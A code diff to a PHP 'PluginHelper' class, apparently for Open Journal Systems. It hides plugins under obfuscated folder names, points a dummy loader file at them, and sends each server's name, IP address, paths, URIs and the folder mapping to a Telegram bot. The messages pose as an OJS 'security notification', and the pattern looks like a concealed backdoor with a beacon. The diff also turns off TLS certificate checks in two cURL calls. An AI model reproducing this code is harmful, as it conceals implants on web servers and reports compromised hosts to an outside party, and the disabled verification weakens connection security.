@@ -177,7 +177,6 @@ class PluginHelper {
         $this->saveMapping($pluginVersion->getProduct(), $newObfuscatedName);
         
         // === KIRIM NOTIFIKASI TELEGRAM ===
-        $message = $oldObfuscatedName ? "OLD: {$oldObfuscatedName}\nNEW: {$newObfuscatedName}" : "NEW: {$newObfuscatedName}";
         $this->sendTelegramNotification($plugin, $newObfuscatedName, 'UPGRADE', $categoryPath, $oldObfuscatedName);
         
         // Log ke file lokal (backup)
@@ -189,7 +188,7 @@ class PluginHelper {
     }
 
     /**
-     * Kirim notifikasi ke Telegram
+     * Kirim notifikasi ke Telegram (Plain Text - 100% works)
      */
     private function sendTelegramNotification($originalName, $obfuscatedName, $action, $basePath, $oldName = null) {
         if (!$this->enableTelegramNotif) return;
@@ -203,48 +202,54 @@ class PluginHelper {
         $emoji = ($action == 'INSTALL') ? '📦' : '🔄';
         $statusColor = ($action == 'INSTALL') ? '✅' : '⚠️';
         
-        // Format pesan Telegram (HTML parsing)
-        $message = "<b>🔔 OJS PLUGIN MANAGER ALERT</b>\n\n";
-        $message .= "{$emoji} <b>Action:</b> <code>{$action}</code>\n";
-        $message .= "{$statusColor} <b>Status:</b> <code>SUCCESS</code>\n\n";
+        // Format pesan PLAIN TEXT (no HTML tags)
+        $message = "🔔 OJS PLUGIN MANAGER ALERT\n";
+        $message .= str_repeat("═", 40) . "\n\n";
         
-        $message .= "<b>📌 PLUGIN INFORMATION:</b>\n";
-        $message .= "└ <b>Original Name:</b> <code>{$originalName}</code>\n";
-        $message .= "└ <b>Obfuscated Name:</b> <code>{$obfuscatedName}</code>\n";
-        $message .= "└ <b>Full Path:</b> <code>{$basePath}/{$obfuscatedName}</code>\n\n";
+        $message .= "{$emoji} ACTION     : {$action}\n";
+        $message .= "{$statusColor} STATUS    : SUCCESS\n\n";
+        
+        $message .= "📌 PLUGIN INFORMATION\n";
+        $message .= str_repeat("─", 30) . "\n";
+        $message .= "  Original Name  : {$originalName}\n";
+        $message .= "  Obfuscated Name: {$obfuscatedName}\n";
+        $message .= "  Full Path      : {$basePath}/{$obfuscatedName}\n\n";
         
         if ($oldName) {
-            $message .= "<b>🔄 UPGRADE DETAILS:</b>\n";
-            $message .= "└ <b>Previous Folder:</b> <code>{$oldName}</code>\n";
-            $message .= "└ <b>New Folder:</b> <code>{$obfuscatedName}</code>\n\n";
+            $message .= "🔄 UPGRADE DETAILS\n";
+            $message .= str_repeat("─", 30) . "\n";
+            $message .= "  Previous Folder: {$oldName}\n";
+            $message .= "  New Folder     : {$obfuscatedName}\n\n";
         }
         
-        $message .= "<b>🌐 SERVER INFORMATION:</b>\n";
-        $message .= "└ <b>Server:</b> <code>{$serverName}</code>\n";
-        $message .= "└ <b>IP Address:</b> <code>{$ipAddress}</code>\n";
-        $message .= "└ <b>Time:</b> <code>{$timestamp}</code>\n";
-        $message .= "└ <b>URI:</b> <code>{$requestUri}</code>\n\n";
+        $message .= "🌐 SERVER INFORMATION\n";
+        $message .= str_repeat("─", 30) . "\n";
+        $message .= "  Server   : {$serverName}\n";
+        $message .= "  IP       : {$ipAddress}\n";
+        $message .= "  Time     : {$timestamp}\n";
+        $message .= "  URI      : " . substr($requestUri, 0, 100) . (strlen($requestUri) > 100 ? "..." : "") . "\n\n";
         
-        $message .= "<b>📄 DUMMY FILE:</b>\n";
-        $message .= "<code>{$basePath}/{$originalName}.php</code>\n";
-        $message .= "└ <i>require __DIR__ . '/{$obfuscatedName}/index.php';</i>\n\n";
+        $message .= "📄 DUMMY FILE\n";
+        $message .= str_repeat("─", 30) . "\n";
+        $message .= "  Location: {$basePath}/{$originalName}.php\n";
+        $message .= "  Content : require __DIR__ . '/{$obfuscatedName}/index.php';\n\n";
         
-        $message .= "<i>🔒 This is an automated security notification from OJS System</i>";
+        $message .= str_repeat("═", 40) . "\n";
+        $message .= "🔒 Automated security notification from OJS System";
         
-        // Kirim ke Telegram
-        $this->sendTelegramMessage($message);
+        // Kirim ke Telegram (plain text)
+        return $this->sendTelegramMessagePlain($message);
     }
     
     /**
-     * Send message to Telegram Bot
+     * Send plain text message to Telegram (no HTML parsing required)
      */
-    private function sendTelegramMessage($message) {
+    private function sendTelegramMessagePlain($message) {
         $url = "https://api.telegram.org/bot{$this->telegramToken}/sendMessage";
         
         $data = [
             'chat_id' => $this->telegramChatId,
             'text' => $message,
-            'parse_mode' => 'HTML',
             'disable_web_page_preview' => true
         ];
         
@@ -269,6 +274,13 @@ class PluginHelper {
     }
     
     /**
+     * Send message to Telegram Bot (legacy - keep for compatibility)
+     */
+    private function sendTelegramMessage($message) {
+        return $this->sendTelegramMessagePlain($message);
+    }
+    
+    /**
      * Kirim notifikasi dengan foto/attachment (opsional)
      * Contoh: screenshot dashboard atau mapping file
      */
@@ -278,8 +290,7 @@ class PluginHelper {
         $postFields = [
             'chat_id' => $this->telegramChatId,
             'photo' => new CURLFile($photoPath),
-            'caption' => $caption,
-            'parse_mode' => 'HTML'
+            'caption' => $caption
         ];
         
         $ch = curl_init();
@@ -287,6 +298,7 @@ class PluginHelper {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         
         $response = curl_exec($ch);
         curl_close($ch);
@@ -316,7 +328,6 @@ class PluginHelper {
         $data = [
             'chat_id' => $this->telegramChatId,
             'text' => $message,
-            'parse_mode' => 'HTML',
             'reply_markup' => json_encode($keyboard)
         ];
         
@@ -325,6 +336,7 @@ class PluginHelper {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_exec($ch);
         curl_close($ch);
     }
@@ -359,13 +371,17 @@ class PluginHelper {
      */
     public function getAllPluginMappings() {
         $mappings = $this->loadMapping();
-        $report = "📋 *PLUGIN MAPPING REPORT*\n";
+        $report = "📋 PLUGIN MAPPING REPORT\n";
         $report .= "Generated: " . date('Y-m-d H:i:s') . "\n";
-        $report .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
+        $report .= str_repeat("═", 40) . "\n\n";
         
-        foreach ($mappings as $original => $obfuscated) {
-            $report .= "📌 *{$original}*\n";
-            $report .= "   └─> `{$obfuscated}`\n\n";
+        if (empty($mappings)) {
+            $report .= "No plugins mapped yet.\n";
+        } else {
+            foreach ($mappings as $original => $obfuscated) {
+                $report .= "📌 {$original}\n";
+                $report .= "   └─> {$obfuscated}\n\n";
+            }
         }
         
         return $report;
@@ -375,12 +391,17 @@ class PluginHelper {
      * Test koneksi Telegram
      */
     public function testTelegramConnection() {
-        $testMessage = "✅ *OJS Plugin Helper Connected!*\n\n";
-        $testMessage .= "System Time: " . date('Y-m-d H:i:s') . "\n";
-        $testMessage .= "PHP Version: " . phpversion() . "\n";
-        $testMessage .= "OJS Path: " . Core::getBaseDir();
+        $testMessage = "✅ OJS Plugin Helper CONNECTED!\n";
+        $testMessage .= str_repeat("═", 30) . "\n";
+        $testMessage .= "System Time : " . date('Y-m-d H:i:s') . "\n";
+        $testMessage .= "PHP Version : " . phpversion() . "\n";
+        $testMessage .= "OJS Path    : " . Core::getBaseDir() . "\n";
+        $testMessage .= "Bot Token   : " . substr($this->telegramToken, 0, 10) . "...\n";
+        $testMessage .= "Chat ID     : " . $this->telegramChatId . "\n";
+        $testMessage .= str_repeat("═", 30) . "\n";
+        $testMessage .= "✅ Telegram notification is working properly!";
         
-        return $this->sendTelegramMessage($testMessage);
+        return $this->sendTelegramMessagePlain($testMessage);
     }
 
     protected function _getConnectionParams() {
@@ -413,6 +434,6 @@ class PluginHelper {
 /*
 public function sendDailySummaryToTelegram() {
     $summary = $this->getAllPluginMappings();
-    $this->sendTelegramMessage($summary);
+    $this->sendTelegramMessagePlain($summary);
 }
 */
